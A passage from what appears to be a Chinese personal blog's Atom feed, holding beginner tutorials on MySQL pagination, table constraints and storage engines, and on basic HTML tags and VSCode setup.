class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">1600.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">1500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">1300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br></pre></td></tr></table></figure><p> <strong>执行顺序</strong><br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>          <span class="number">5</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span>            <span class="number">1</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>           <span class="number">2</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span>        <span class="number">3</span>号</span><br><span class="line"></span><br><span class="line"><span class="keyword">having</span>          <span class="number">4</span>号</span><br><span class="line"></span><br><span class="line">limit           <span class="number">6</span>号</span><br><span class="line">注：limit 是 <span class="keyword">sql</span>语句 最后执行的环节</span><br></pre></td></tr></table></figure></p><h1 id="通用标准分页"><a href="#通用标准分页" class="headerlink" title="通用标准分页"></a>通用标准分页</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">将 a 条数据分成 b 页显示，每页显示（a<span class="operator">/</span>b）条数据</span><br><span class="line">第<span class="number">1</span>页：limit <span class="number">0</span>,(a<span class="operator">/</span>b)</span><br><span class="line">......</span><br><span class="line">第n页：limit (n<span class="number">-1</span>)<span class="operator">*</span>(a<span class="operator">/</span>b),(a<span class="operator">/</span>b)</span><br></pre></td></tr></table></figure><h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h1><blockquote><p><strong>建表时，给表中的字段添加相应的一些约束，目的是保证表中数据的合法性，有效性，完整性。</strong></p></blockquote><p>包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">非空约束（not null）：约束的字段不能为NULL</span><br><span class="line">唯一约束（unique）：约束的字段不能重复</span><br><span class="line">主键约束（primary key）：约束的字段既不能为NULL，也不能重复，简称PK</span><br><span class="line">外键约束（foreign key）：简称FK</span><br><span class="line">检查约束（check）：Oracle中有该约束，Mysql中不支持</span><br></pre></td></tr></table></figure><p><strong>非空约束 (not null)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">     id <span class="type">int</span> <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">     name <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">);</span><br><span class="line">只有列级约束，没有表级约束</span><br></pre></td></tr></table></figure><p><strong>唯一约束 (unique)</strong></p><blockquote><p>唯一性约束的字段具有唯一性，不能重复，但可以为 NIULL ，也可存在多个NULL，因为NULL不是一个值。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">     id <span class="type">int</span> <span class="keyword">unique</span>,</span><br><span class="line">     name <span class="type">varchar</span>(<span class="number">255</span>) <span class="keyword">unique</span>,</span><br><span class="line">);</span><br><span class="line">列级约束：指 id 与 name 单独均不可重复</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">     id <span class="type">int</span>,</span><br><span class="line">     name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">     <span class="keyword">unique</span>(id,name)</span><br><span class="line">);</span><br><span class="line">表级约束：指 id 与 name 联合起来不允许重复，单独可重复</span><br></pre></td></tr></table></figure><p><strong>主键约束（primary key）</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">    id <span class="type">int</span> <span class="keyword">primary</span> key,<span class="operator">/</span><span class="operator">/</span>列级约束</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(id,name) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;lihua&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">    id <span class="type">int</span>,</span><br><span class="line">    name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">    <span class="keyword">primary</span> key(id)<span class="operator">/</span><span class="operator">/</span>表级约束</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(id,name) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;lihua&#x27;</span>);</span><br><span class="line">相关术语：</span><br><span class="line">主键约束：<span class="keyword">primary</span> key</span><br><span class="line">主键字段：id,name</span><br><span class="line">主键值：<span class="number">1</span>,<span class="string">&#x27;lihua&#x27;</span></span><br></pre></td></tr></table></figure><p>主键的作用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表设计三范式中要求：任何一张表中都应该有主键</span><br><span class="line">主键是改条记录在这张表中的 唯一标识</span><br></pre></td></tr></table></figure><p>主键的分类：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">根据主键的字段数量划分：</span><br><span class="line">单一主键(只给一个字段添加主键约束)</span><br><span class="line">复合主键(多个字段联合起来添加一个主键约束)</span><br><span class="line"></span><br><span class="line">根据主键性质划分：</span><br><span class="line">自然主键</span><br><span class="line">业务主键：主键值与系统的业务挂钩，比如以身份证号，银行卡号作为主键等</span><br><span class="line">注：不推荐使用业务主键，以免以后业务发生改变，主键不易更改</span><br></pre></td></tr></table></figure><p><strong>注：在一张表中，主键约束只能有一个</strong></p><p><strong>主键值自增</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">      id <span class="type">int</span> <span class="keyword">primary</span> key auto_increment,</span><br><span class="line">      name <span class="type">varchar</span>(<span class="number">255</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(name) <span class="keyword">values</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(name) <span class="keyword">values</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(name) <span class="keyword">values</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_tea;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> a    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">2</span> <span class="operator">|</span> b    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">3</span> <span class="operator">|</span> c    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------+</span></span><br><span class="line">注：Oracle 中提供了一个自增机制<span class="operator">-</span>序列（sequence）对象</span><br></pre></td></tr></table></figure><p><strong>外键约束 (foreign key)</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用外键约束的字段去引用另一张表中的某个字段</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">相关术语：</span><br><span class="line">外键约束：<span class="keyword">foreign</span> key</span><br><span class="line">外键字段： </span><br><span class="line">外键值：</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> t_stu;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> if <span class="keyword">exists</span> t_tea;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>创建父表：老师表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_tea(</span><br><span class="line">       teano <span class="type">int</span>,</span><br><span class="line">       name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">       <span class="keyword">primary</span> key(teano)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(teano,name) <span class="keyword">values</span>(<span class="number">1001</span>,<span class="string">&#x27;cao&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(teano,name) <span class="keyword">values</span>(<span class="number">1002</span>,<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_tea(teano,name) <span class="keyword">values</span>(<span class="number">1003</span>,<span class="string">&#x27;zhou&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_tea;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>创建子表：学生表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t_stu(</span><br><span class="line">      id <span class="type">int</span>,</span><br><span class="line">      name <span class="type">varchar</span>(<span class="number">255</span>),</span><br><span class="line">      tno <span class="type">int</span>,</span><br><span class="line">      <span class="keyword">primary</span> key(id),</span><br><span class="line">      <span class="keyword">foreign</span> key(tno) <span class="keyword">references</span> t_tea(teano)<span class="operator">/</span><span class="operator">/</span>外键约束：t_stu表中的tno字段值只能为t_tea 表中的teano字段的值</span><br><span class="line">);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(id,name,tno) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;wangwu&#x27;</span>,<span class="number">1003</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(id,name,tno) <span class="keyword">values</span>(<span class="number">2</span>,<span class="string">&#x27;xiaohong&#x27;</span>,<span class="number">1002</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t_stu(id,name,tno) <span class="keyword">values</span>(<span class="number">3</span>,<span class="string">&#x27;zhoujun&#x27;</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t_stu;</span><br><span class="line"></span><br><span class="line">注:</span><br><span class="line">创建：先创建父表再创建子表</span><br><span class="line">插入数据：先插入父表再插入子表</span><br><span class="line">删除数据：先删除子表再删除父表</span><br><span class="line">删除表：先删除子表再删除父表</span><br><span class="line"></span><br><span class="line">外键可为 <span class="keyword">NULL</span> </span><br><span class="line">使用外键约束的字段去引用另一张表中的某个字段，被引用的字段一般为主键，不是主键也可，但必须有唯一性，即 <span class="keyword">unique</span> 约束。</span><br></pre></td></tr></table></figure><h1 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a>存储引擎</h1><blockquote><p><strong>表的存储方式，不同存储引擎采用不同的方式在数据库中存储表</strong></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看当前 Mysql 支持的存储引擎：</span><br><span class="line"><span class="keyword">show</span> engines;</span><br></pre></td></tr></table></figure><p><strong>MyISAM 存储引擎</strong></p><blockquote><p><strong>是最常用的，但不是默认的 ，它使用三个文件来表示每张表。<br>格式文件：columns_priv.frm<br>数据文件：columns_priv.MYD<br>索引文件：columns_priv.MYI<br>优点：可被转换为压缩，只读表来节省空间<br>缺点：不支持事务</strong></p></blockquote><p><strong>InnoDB 存储引擎</strong></p><blockquote><p><strong>1.优点：支持事务，行级锁，外链等。<br>2该存储引擎数据的安全得到保障。<br>3.表的结构存储在 xxx.frm文件中 数据存储在 tablespqce这样的表空间中，无法被压缩，无法转换为只读<br>4.该引擎在Mysql数据库崩溃之后会自动提供恢复机制。<br>5.它支持级联删除和级联更新</strong></p></blockquote><p><strong>MEMORY 存储引擎</strong></p><blockquote><p><strong>1.不支持事务，数据容易丢失，由于所以数据和索引被存储在内存当中<br>2.优点：查询速度最快</strong></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="MYSQL" scheme="https://xizhi-future.github.io/categories/MYSQL/"/>
    
    
    <category term="MYSQL" scheme="https://xizhi-future.github.io/tags/MYSQL/"/>
    
  </entry>
  
  <entry>
    <title>HTML基础全</title>
    <link href="https://xizhi-future.github.io/2021/11/19/HTML%E5%9F%BA%E7%A1%80%E5%85%A8/"/>
    <id>https://xizhi-future.github.io/2021/11/19/HTML%E5%9F%BA%E7%A1%80%E5%85%A8/</id>
    <published>2021-11-19T08:45:05.000Z</published>
    <updated>2021-11-19T08:46:59.665Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="HTML-创建站点-–-环境：VScode"><a href="#HTML-创建站点-–-环境：VScode" class="headerlink" title="HTML 创建站点 – 环境：VScode"></a>HTML 创建站点 – 环境：VScode</h2><p><strong>创建站点</strong>：包含基本文件<br><img src="https://img-blog.csdnimg.cn/20210109140819801.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210109140831761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>VScode 配置</strong></p><p><strong>插件安装：</strong><br><img src="https://img-blog.csdnimg.cn/20210109141233418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>插件<br><img src="https://img-blog.csdnimg.cn/20210109141124299.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210109141134688.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210109141149567.png" alt="在这里插入图片描述"><br><strong>将文件夹添加至工作区：</strong></p><p>文件 – 将文件夹添加到工作区 – 选择文件夹<br><img src="https://img-blog.csdnimg.cn/20210109141811698.png" alt="在这里插入图片描述"><br><strong>新建 html 文档 ：</strong></p><p>工作区选中文件夹中，Ctrl + N –&gt; Ctrl + S –&gt; 设置文件夹名，后缀为 .html 或者 .htm</p><h2 id="HTML基本架构："><a href="#HTML基本架构：" class="headerlink" title="HTML基本架构："></a>HTML基本架构：</h2><p>先输入一个 ! 号，然后按一下 Tab 键即可<br><img src="https://img-blog.csdnimg.cn/20210109142316620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>基本架构理解</strong></p><p><img src="https://img-blog.csdnimg.cn/20210109144116916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTA3NTk4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="HTML（二）-概述-常用标签-转义字符"><a href="#HTML（二）-概述-常用标签-转义字符" class="headerlink" title="HTML（二） 概述+常用标签+转义字符"></a>HTML（二） 概述+常用标签+转义字符</h2><p><strong>(HyperText Markup Language)–超文本标记语言</strong></p><p>1.用于编写网页，是一种<strong>解释型</strong>(写出来的代码即可直接进行运行,不需要编译)的语言<br>2.其源文件是纯文本的，放在web根目录之下<br>3.HTML是一种 <strong>标记语言</strong>，后缀名为  <strong>.html</strong>  或者是 <strong>.htm</strong><br>4.语法构成：<strong>标签+属性</strong>，即尖括号后开头为<strong>标签</strong>，标签中可设置 <strong>属性</strong> 以及 <strong>属性值</strong>，<br>属性值放于引号中，不同属性用空格隔开<br>5.HTML的运行环境是 <strong>浏览器</strong><br>6.<strong>注释</strong>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">注释的内容</span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><blockquote><p>拓展：<br>1.C语言源代码–&gt;<strong>编译</strong>–&gt;二进制文件–&gt;计算机解释执行<br>Java同上<br>2.HTML标签分为：单标签(空标签，没有结束标签)，双标签(成对出现)</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">导入 CSS 文件：</span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;**.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">导入 JS 文件：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/**.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">CSS 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span>嵌入css样式代码<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">JS 代码：</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>...<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>文本标签</strong></p><p><strong>标题标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span> <span class="tag">&lt;/<span class="name">h1</span>&gt;</span>     特点:其样式均为默认状态，即文本大小的设置，以及加粗设置</span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span> <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span> <span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span> <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h5</span>&gt;</span> <span class="tag">&lt;/<span class="name">h5</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h6</span>&gt;</span> <span class="tag">&lt;/<span class="name">h6</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="number">1</span>.&lt;<span class="selector-tag">h1</span>&gt;&lt;/<span class="selector-tag">h1</span>&gt;标签在一个网页中最好只用一次</span><br><span class="line"><span class="number">2</span>.这六个标题标签不能互相嵌套</span><br></pre></td></tr></table></figure><p><strong>文本相关设置标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">i</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>        倾斜</span><br><span class="line"><span class="tag">&lt;<span class="name">em</span>&gt;</span><span class="tag">&lt;/<span class="name">em</span>&gt;</span>   强调斜体</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">b</span>&gt;</span>        加粗</span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">u</span>&gt;</span><span class="tag">&lt;/<span class="name">u</span>&gt;</span>        下划线</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">sup</span>&gt;</span><span class="tag">&lt;/<span class="name">sup</span>&gt;</span>    下标</span><br><span class="line"><span class="tag">&lt;<span class="name">sub</span>&gt;</span><span class="tag">&lt;/<span class="name">sub</span>&gt;</span>    上标</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span>        段落</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>  字符 或 小段文本 标签，是 行内元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>          一个块，作容器，用于网页布局，是 块级元素</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span>  字体设置  </span><br><span class="line">    size</span><br><span class="line">    color</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span>         水平线</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span>         换行</span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">del</span>&gt;</span><span class="tag">&lt;/<span class="name">del</span>&gt;</span>   删除线</span><br><span class="line"> </span><br><span class="line">A<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>下标</span><br><span class="line">    </span><br><span class="line">B<span class="tag">&lt;<span class="name">sup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">sup</span>&gt;</span>上标</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="number">1</span>.&lt;<span class="selector-tag">p</span>&gt;&lt;/<span class="selector-tag">p</span>&gt;标签中不能嵌套标题标签</span><br></pre></td></tr></table></figure><blockquote><p>扩展：**&lt; span &gt;与&lt; div &gt;**<br><strong>行内元素</strong>：一个行内元素只占据它对应标签的边框所包含的空间<br><strong>块级元素</strong>：块级元素占据其父元素（容器）的整个空间，创建了一个“<strong>块</strong>”，一般浏览器会在块级元素后另起一个新行。</p></blockquote><p><strong>超链接</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  属性：</span><br><span class="line">         href=&quot;&quot;   跳转的路径</span><br><span class="line">         target=&quot;&quot;，属性值：</span><br><span class="line">_self(默认值，覆盖当前页面)；</span><br><span class="line">_blank(将会新弹出一个窗口)</span><br><span class="line">_parent 父窗口</span><br><span class="line">_top  顶级窗口</span><br><span class="line">_framename  窗口名</span><br><span class="line">         title=&quot;&quot;  提示信息</span><br><span class="line">         rel=&quot;nofollow&quot;</span><br></pre></td></tr></table></figure><p>扩展</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空链接         &lt;<span class="selector-tag">a</span> href=&quot;#&quot;&gt;&lt;/<span class="selector-tag">a</span>&gt;   </span><br><span class="line"><span class="selector-tag">a</span> 模拟按钮     &lt;<span class="selector-tag">a</span> href=&quot;javascript:<span class="built_in">void</span>(<span class="number">0</span>)<span class="string">&quot;&gt;按钮&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p><strong>img 标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>    属性：</span><br><span class="line">         src=&quot;&quot;   图片路径</span><br><span class="line">         alt=&quot;&quot;   当图片未正常加载出来时，将会显示alt中的文本替换图片 </span><br><span class="line">                  利于SEO优化，由于搜索引擎无法读取图片上面的文本</span><br><span class="line">         title=&quot;&quot; 提示信息</span><br><span class="line">         </span><br><span class="line">         width=&quot;&quot;  长</span><br><span class="line">         height=&quot;&quot; 宽</span><br><span class="line">         border=&quot;&quot; 边框</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line">绝对路径： http://www.baidu.com</span><br><span class="line">相对路径：<span 